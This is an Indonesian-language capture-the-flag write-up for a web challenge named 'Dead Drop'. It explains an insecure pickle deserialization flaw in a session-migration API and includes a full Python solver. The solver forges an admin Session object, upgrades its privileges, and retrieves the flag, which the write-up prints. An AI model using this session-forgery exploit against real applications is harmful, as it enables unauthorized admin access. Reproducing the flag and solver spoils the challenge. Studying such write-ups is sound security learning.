# 3. Dead Drop

**Kategori:** Web Exploitation  
**Target:** `http://cyberleague-shared-alb-586365318.ap-southeast-1.elb.amazonaws.com:30101`  
**Flag format:** `CYBERLEAGUE{...}`



## Deskripsi

Aplikasi Dead Drop menyediakan session migration. Server menerima object session yang diserialisasi dengan Python `pickle`. Struktur object yang dikirim client ternyata tidak divalidasi secara cukup ketat.

## 3.1 Titik Kerentanan

Endpoint utama:

```http
POST /api/migrate
```

Aplikasi menerima `session_data` dalam bentuk Base64 pickle.

Masalahnya adalah server melakukan deserialization ke object Python lalu hanya memeriksa sebagian atribut.

Validasi yang masih lolos:

```text
created_at       → harus dekat dengan waktu sekarang
 token            → harus diawali "dd-"
role             → tidak dipaksa menjadi "user"
```

Akibatnya attacker dapat membuat `Session` baru secara lokal dengan:

```text
username  = forged-courier
role      = admin
created_at = current time
token     = dd-forged
```

## 3.2 Why Pickle Works

`pickle` bukan format data pasif. Deserialisasi dapat merekonstruksi object Python dengan module/class metadata.

Agar pickle menerima object bernama `main.Session`, pada solver dibuat module dummy bernama `main` lalu class `Session` diekspor ke module tersebut.

## 3.3 Solver

```python
#!/usr/bin/env python3

import base64
import pickle
import requests
import sys
import time
import types

BASE_URL = (
    "http://cyberleague-shared-alb-586365318."
    "ap-southeast-1.elb.amazonaws.com:30101"
)


def build_forged_session() -> str:
    fake_main = types.ModuleType("main")

    class Session:
        pass

    Session.__module__ = "main"
    Session.__qualname__ = "Session"
    fake_main.Session = Session
    sys.modules["main"] = fake_main

    session = Session()
    session.username = "forged-courier"
    session.role = "admin"
    session.created_at = int(time.time())
    session.token = "dd-forged"

    raw = pickle.dumps(session, protocol=4)

    if len(raw) > 512:
        raise RuntimeError(f"Payload too large: {len(raw)} bytes")

    return base64.b64encode(raw).decode()


def main():
    s = requests.Session()

    # 1. Obtain legitimate session
    print("[*] Requesting legitimate session...")
    r = s.post(f"{BASE_URL}/api/join", timeout=10)
    r.raise_for_status()

    join_data = r.json()
    user_token = join_data["token"]

    print(f"[+] Handle : {join_data['handle']}")
    print(f"[+] Role   : {join_data['role']}")
    print(f"[+] Token  : {user_token}")

    # 2. Build forged session
    payload = build_forged_session()
    print(f"[+] Pickle/Base64 size: {len(payload)} characters")

    # 3. Migrate
    r = s.post(
        f"{BASE_URL}/api/migrate",
        headers={
            "Authorization": f"Bearer {user_token}",
            "Content-Type": "application/json",
        },
        json={"session_data": payload},
        timeout=10,
    )

    print(f"[+] HTTP {r.status_code}")
    print(f"[+] Response: {r.text}")

    if r.status_code != 200:
        sys.exit(1)

    migrate_data = r.json()
    if migrate_data.get("role") != "admin":
        raise RuntimeError("Session was not upgraded to admin")

    admin_token = migrate_data["token"]

    # 4. Read flag
    r = s.get(
        f"{BASE_URL}/api/flag",
        headers={"Authorization": f"Bearer {admin_token}"},
        timeout=10,
    )

    print(f"[+] HTTP {r.status_code}")
    print(f"[+] Response: {r.text}")

    data = r.json()
    flag = data.get("flag")
    if flag:
        print(f"[+] FLAG: {flag}")


if __name__ == "__main__":
    main()
```

## 3.4 Output

```text
[*] Requesting legitimate session...
[+] Handle : flare-zero-golden-raven
[+] Role   : user
[+] Token  : dd-154616729db6b41a25990a65e7f04319

[*] Building forged Session object...
[+] Pickle/Base64 size: 160 characters

[*] Sending forged session to /api/migrate...
[+] HTTP 200
[+] Response: {"username":"forged-courier","role":"admin","token":"dd-dbab112728fe1aceb354e8b2ba4bb3be","message":"Session migrated successfully"}

[*] Requesting /api/flag...
[+] HTTP 200
[+] Response: {"flag":"CYBERLEAGUE{d34d_dr0p_d0ubl3_d3f3ns3}"}
```

## Flag

```text
CYBERLEAGUE{d34d_dr0p_d0ubl3_d3f3ns3}
```

## Root Cause

```text
Insecure Deserialization
        ↓
Session Object Forgery
        ↓
Privilege Escalation
        ↓
Admin Session
        ↓
/api/flag
```

---
